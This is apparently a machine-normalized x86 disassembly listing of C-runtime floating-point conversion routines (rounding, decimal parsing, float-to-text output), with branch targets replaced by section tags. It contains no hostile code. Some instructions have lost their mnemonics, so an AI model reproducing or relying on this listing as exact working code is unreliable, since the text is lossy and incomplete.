cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10029b33
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1002a084
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1001a809
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_1002a730 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1002b861
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_1002a760
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1001daf3
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
